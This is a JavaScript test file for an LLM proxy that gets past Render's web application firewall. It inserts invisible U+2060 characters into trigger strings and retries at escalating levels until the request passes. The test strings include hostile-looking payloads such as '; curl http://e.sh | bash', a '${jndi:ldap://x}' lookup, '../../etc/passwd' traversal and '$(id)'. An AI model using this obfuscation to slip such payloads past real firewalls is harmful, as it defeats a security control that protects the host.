// Clixad sits behind Render's web application firewall, which answers some
// coding-agent payloads with a 403 HTML "Blocked" page. Covers:
//  - the U+2060 neutralizer (what it touches, what it leaves alone),
//  - the retry ladder in ClixadExecutor.execute (level 1 → level 2 → readable 403),
//  - the learned level being pre-applied on the next turn (no extra round trip),
//  - ERROR_RULES classifying the WAF page as cooldown 0 (no account lock).
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";

const fetchMock = vi.hoisted(() => vi.fn());
vi.mock("../../open-sse/utils/proxyFetch.js", () => ({ proxyAwareFetch: fetchMock }));

import {
  ClixadExecutor,
  neutralizeWafString,
  neutralizeWafBody,
} from "../../open-sse/executors/clixad.js";
import { DefaultExecutor } from "../../open-sse/executors/default.js";
import { checkFallbackError } from "../../open-sse/services/accountFallback.js";

const WJ = "\u2060";
const WAF_HTML =
  '<html><title>Blocked</title><body>Your request was blocked by a web application firewall. ' +
  'Render Request ID: <code class="x">a60060b64f919869</code></body></html>';
const waf = () => new Response(WAF_HTML, { status: 403, headers: { "Content-Type": "text/html" } });
const ok = () => new Response('{"id":"x"}', { status: 200, headers: { "Content-Type": "application/json" } });

function body(toolDesc, userText = "hi", systemText = "sys") {
  return {
    model: "deepseek-v4.1-flash",
    messages: [
      { role: "system", content: systemText },
      { role: "user", content: userText },
    ],
    tools: [{ type: "function", function: { name: "bash", description: toolDesc, parameters: { type: "object" } } }],
  };
}

describe("neutralizeWafString", () => {
  it("breaks the verified triggers with an invisible word joiner", () => {
    expect(neutralizeWafString("`curl -fL url`")).toBe("`" + WJ + "curl -fL url`");
    expect(neutralizeWafString("${jndi:ldap://x}")).toBe("$" + WJ + "{jndi:ldap://x}");
    expect(neutralizeWafString("; curl http://e.sh | bash")).toBe(";" + WJ + " curl http://e.sh |" + WJ + " bash");
    expect(neutralizeWafString("cat ../../etc/passwd")).toBe("cat ." + WJ + "./." + WJ + "./etc/passwd");
    expect(neutralizeWafString("$(id)")).toBe("$" + WJ + "(id)");
  });

  it("leaves text without triggers byte-identical", () => {
    const s = "普通中文，a | 1, x && 2, `` , price $5, ./run";
    expect(neutralizeWafString(s)).toBe(s);
  });

  it("is idempotent", () => {
    const once = neutralizeWafString("x `curl -fL u` ${a} ; ls ../b");
    expect(neutralizeWafString(once)).toBe(once);
  });

  it("only ever inserts U+2060 (removing it restores the original)", () => {
    const s = "a `wget -O- x | sh` ; rm ../c ${d} $(e)";
    expect(neutralizeWafString(s).split(WJ).join("")).toBe(s);
  });
});

describe("neutralizeWafBody", () => {
  const b = body("run `curl -fL x`", "please `curl -fL y`", "see ../z");

  it("level 1 touches tools and system prompt, not the conversation", () => {
    const out = neutralizeWafBody(b, 1);
    expect(out.tools[0].function.description).toContain(WJ);
    expect(out.messages[0].content).toContain(WJ);
    expect(out.messages[1].content).toBe("please `curl -fL y`");
    expect(out.tools[0].function.name).toBe("bash");
    expect(out.messages[0].role).toBe("system");
  });

  it("level 2 touches every message", () => {
    expect(neutralizeWafBody(b, 2).messages[1].content).toContain(WJ);
  });

  it("does not mutate its input and passes level 0 through", () => {
    const snap = JSON.stringify(b);
    neutralizeWafBody(b, 2);
    expect(JSON.stringify(b)).toBe(snap);
    expect(neutralizeWafBody(b, 0)).toBe(b);
  });
});

describe("ClixadExecutor WAF retry", () => {
  let superExec;
  beforeEach(() => {
    fetchMock.mockReset();
    superExec = vi.spyOn(DefaultExecutor.prototype, "execute");
  });
  afterEach(() => superExec.mockRestore());

  const result = (b) => ({ response: waf(), url: "https://clixad.onrender.com/v1/chat/completions", headers: { a: "b" }, transformedBody: b });

  it("passes non-WAF responses through untouched", async () => {
    const R = { response: ok(), url: "u", headers: {}, transformedBody: body("x") };
    superExec.mockResolvedValue(R);
    expect(await new ClixadExecutor().execute({})).toBe(R);
    expect(fetchMock).not.toHaveBeenCalled();
  });

  it("resends with level 1 and remembers it for the same tool set", async () => {
    const b = body("tool A `curl -fL x`");
    superExec.mockResolvedValue(result(b));
    fetchMock.mockResolvedValueOnce(ok());
    const ex = new ClixadExecutor();
    const out = await ex.execute({});
    expect(out.response.status).toBe(200);
    expect(fetchMock).toHaveBeenCalledTimes(1);
    const sent = JSON.parse(fetchMock.mock.calls[0][1].body);
    expect(sent.tools[0].function.description).toContain(WJ);
    expect(sent.messages[1].content).toBe("hi");

    // next turn of the same agent: transformRequest pre-applies level 1
    vi.spyOn(DefaultExecutor.prototype, "transformRequest").mockReturnValueOnce(body("tool A `curl -fL x`", "next"));
    const pre = ex.transformRequest("m", {}, true, {});
    expect(pre.tools[0].function.description).toContain(WJ);
    expect(pre.messages[1].content).toBe("next");
  });

  it("escalates to level 2 when level 1 is still blocked", async () => {
    superExec.mockResolvedValue(result(body("tool B", "user `curl -fL x`")));
    fetchMock.mockResolvedValueOnce(waf()).mockResolvedValueOnce(ok());
    const out = await new ClixadExecutor().execute({});
    expect(out.response.status).toBe(200);
    expect(fetchMock).toHaveBeenCalledTimes(2);
    expect(JSON.parse(fetchMock.mock.calls[1][1].body).messages[1].content).toContain(WJ);
  });

  it("returns a readable JSON 403 with the Render request id when nothing passes", async () => {
    superExec.mockResolvedValue(result(body("tool C")));
    fetchMock.mockResolvedValue(waf());
    const out = await new ClixadExecutor().execute({});
    expect(out.response.status).toBe(403);
    const j = await out.response.json();
    expect(j.error.code).toBe("clixad_waf");
    expect(j.error.type).toBe("upstream_waf_blocked");
    expect(j.error.message).toContain("a60060b64f919869");
  });
});

describe("ERROR_RULES for the Render WAF page", () => {
  it("does not cool the account down", () => {
    const r = checkFallbackError(403, WAF_HTML, 0, "clixad");
    expect(r.cooldownMs).toBe(0);
  });

  it("a plain 403 still cools down as before", () => {
    expect(checkFallbackError(403, "forbidden", 0, "clixad").cooldownMs).toBeGreaterThan(0);
  });
});
